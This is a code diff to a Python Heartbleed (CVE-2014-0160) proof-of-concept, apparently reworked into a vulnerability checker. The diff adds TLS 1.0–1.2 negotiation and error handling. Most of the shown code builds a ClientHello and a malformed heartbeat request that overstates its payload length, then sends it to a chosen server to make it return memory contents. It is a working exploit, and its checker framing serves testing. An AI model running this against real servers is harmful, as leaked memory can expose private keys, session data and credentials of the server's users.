@@ -3,6 +3,8 @@
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
 #
+# TLS version support by takeshix <takeshix@adversec.com>
+#
 # Minor changes to return all messages rather than print them by Jonathan Dieter (jdieter@lesbg.com)
 # The author disclaims copyright to this source code.
 
@@ -12,31 +14,73 @@ import time
 import select
 import re
 
-def h2bin(x):
-    return x.replace(' ', '').replace('\n', '').decode('hex')
+tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}
 
-hello = h2bin('''
-16 03 02 00  dc 01 00 00 d8 03 02 53
-43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
-bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
-00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
-00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
-c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
-c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
-c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
-c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
-00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
-03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
-00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
-00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
-00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01
-''')
+def hex2bin(arr):
+    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')
 
-hb = h2bin('''
-18 03 02 00 03
-01 40 00
-''')
+def build_client_hello(tls_ver):
+    t = struct.pack("!I", int(time.time()))
+    client_hello = [
+    # TLS header ( 5 bytes)
+    0x16, # Content type (0x16 for handshake)
+    0x03, tls_ver, # TLS Version
+    0x00, 0xdc, # Length
+    # Handshake header
+    0x01, # Type (0x01 for ClientHello)
+    0x00, 0x00, 0xd8, # Length
+    0x03, tls_ver, # TLS Version
+    # Random (32 byte)
+    ord(t[0]), ord(t[1]), ord(t[2]), ord(t[3]), 0x91, 0x92, 0x74, 0x1b,
+    0xdc, 0x3c, 0xbf, 0x14, 0x12, 0x8a, 0x68, 0xa7,
+    0xef, 0xb1, 0x34, 0xa4, 0xc4, 0x26, 0x1a, 0x55,
+    0xa3, 0x91, 0x9d, 0xa7, 0x05, 0x23, 0x04, 0xfe,
+    0x00, # Session ID length
+    0x00, 0x66, # Cipher suites length
+    # Cipher suites (51 suites)
+    0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
+    0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
+    0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
+    0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
+    0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
+    0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
+    0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
+    0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
+    0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
+    0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
+    0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
+    0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
+    0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
+    0x01, # Compression methods length
+    0x00, # Compression method (0x00 for NULL)
+    0x00, 0x49, # Extensions length
+    # Extension: ec_point_formats
+    0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
+    # Extension: elliptic_curves
+    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
+    0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
+    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
+    0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
+    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
+    0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
+    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
+    # Extension: SessionTicket TLS
+    0x00, 0x23, 0x00, 0x00,
+    # Extension: Heartbeat
+    0x00, 0x0f, 0x00, 0x01, 0x01
+    ]
+    return client_hello
+
+def build_heartbeat(tls_ver):
+    heartbeat = [
+    0x18, # Content Type (Heartbeat)
+    0x03, tls_ver, # TLS version
+    0x00, 0x03, # Length
+    # Payload
+    0x01, # Type (Request)
+    0x40, 0x00 # Payload length
+    ]
+    return heartbeat
 
 def hexdump(s):
     return ""
@@ -67,7 +111,6 @@ def recvall(s, length, timeout=5):
             remain -= len(data)
     return rdata
 
-
 def recvmsg(s):
     vrb = ""
     hdr = recvall(s, 5)
@@ -86,32 +129,60 @@ def hit_hb(server, port):
     vrb = ""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     vrb += 'Connecting...\n'
-    #sys.stdout.flush()
     try:
         s.connect((server, port))
     except:
         return (2, "Unable to connect", vrb)
-    vrb += 'Sending Client Hello...\n'
-    #sys.stdout.flush()
-    s.send(hello)
-    vrb += 'Waiting for Server Hello...\n'
-    #sys.stdout.flush()
-    while True:
-        typ, ver, pay, new_vrb = recvmsg(s)
-        vrb += new_vrb
-        if typ == None:
-            return (2, 'Server closed connection without sending Server Hello.', vrb)
-        # Look for server hello done message.
-        if typ == 22 and ord(pay[0]) == 0x0E:
-            break
+
+    supported = False
+
+    for num in (0x03, 0x02, 0x01):
+        tlsver = tls_versions[num]
+        vrb += 'Sending Client Hello for {}...\n'.format(tlsver)
+
+        try:
+            s.send(hex2bin(build_client_hello(num)))
+        except Exception, e:
+            vrb += '%s\n' % e
+            return (2, 'Error establishing a secure connection with the server.  Have you lost network connectivity?', vrb)
+        vrb += 'Waiting for Server Hello...\n'
+        while True:
+            try:
+                typ, ver, pay, new_vrb = recvmsg(s)
+            except Exception, e:
+                vrb += '%s\n' % e
+                return (2, 'Error receiving response when trying to establish a secure connection to the server.  Have you lost network connectivity?', vrb)
+
+            vrb += new_vrb
+            if typ is None:
+                vrb += 'Server closed connection without sending ServerHello for {}\n'.format(tlsver)
+                continue
+            if typ == 22 and ord(pay[0]) == 0x0E:
+                vrb += 'Received Server Hello for {}\n'.format(tlsver)
+                supported = num
+                break
+        if supported: break
+
+    if not supported:
+        vrb += "Server is not using any version of TLS that's supported"
+        return (2, 'We were unable to establish a secure connection to the server.  This could be because the server isn\'t running any secure services, or there may have been some connection difficulties', vrb)
 
     vrb += 'Sending heartbeat request...\n'
-    #sys.stdout.flush()
-    s.send(hb)
+    try:
+        s.send(hex2bin(build_heartbeat(supported)))
+        # Send twice for immediate response without timeout
+        s.send(hex2bin(build_heartbeat(supported)))
+    except Exception, e:
+        vrb += '%s\n' % e
+        return (2, 'Error sending heartbeat to the server.  Have you lost network connectivity?', vrb)
 
-    s.send(hb)
     while True:
-        typ, ver, pay, new_vrb = recvmsg(s)
+        try:
+            typ, ver, pay, new_vrb = recvmsg(s)
+        except Exception, e:
+            vrb += '%s\n' % e
+            return (2, 'Error receiving response when trying to receive heartbeat from the server.  In this particular case, the most likely explanation is that you\'ve lost network connectivity', vrb)
+
         vrb += new_vrb
         if typ is None:
             return (0, 'Server is not vulnerable.  It ignored the malformed heartbeat message.', vrb)
